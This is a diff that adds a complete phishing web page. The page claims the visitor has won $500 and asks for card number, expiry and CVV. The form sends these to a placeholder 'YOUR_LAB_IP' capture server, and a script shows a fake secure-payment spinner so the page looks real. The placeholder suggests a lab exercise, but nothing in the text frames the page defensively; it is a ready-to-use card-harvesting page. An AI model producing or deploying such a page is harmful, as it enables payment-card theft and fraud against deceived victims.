@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Promo Winner | Claim Now</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 350px; }
+        h1 { color: #2ecc71; margin-bottom: 10px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; }
+        button { width: 100%; padding: 12px; background-color: #2ecc71; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.3s; }
+        button:hover { background-color: #27ae60; }
+        
+        /* The Spinner CSS */
+        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #2ecc71; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main-box">
+    <h1>CONGRATS!</h1>
+    <p>You've won <strong>$500.00</strong></p>
+    <p style="font-size: 0.8em; color: #666;">Verify your card to receive the transfer.</p>
+
+    <form id="phish-form" action="http://YOUR_LAB_IP:5000/capture" method="POST">
+        <input type="text" name="cc_num" placeholder="Card Number (16 digits)" required>
+        <div style="display: flex; gap: 10px;">
+            <input type="text" name="expiry" placeholder="MM/YY" required>
+            <input type="text" name="cvv" placeholder="CVV" required>
+        </div>
+        <button type="submit" id="submit-btn">CLAIM WINNINGS</button>
+    </form>
+
+    <div id="loader-icon" class="loader"></div>
+    <p id="loading-text" class="hidden">Connecting to Secure Payment Gateway...</p>
+</div>
+
+<script>
+    const form = document.getElementById('phish-form');
+    const loader = document.getElementById('loader-icon');
+    const loadingText = document.getElementById('loading-text');
+    const submitBtn = document.getElementById('submit-btn');
+
+    form.onsubmit = function() {
+        // Show the spinner and hide the button to look real
+        submitBtn.classList.add('hidden');
+        loader.style.display = 'block';
+        loadingText.classList.remove('hidden');
+        
+        // The form will now submit to the Python backend automatically
+    };
+</script>
+
+</body>
+</html>
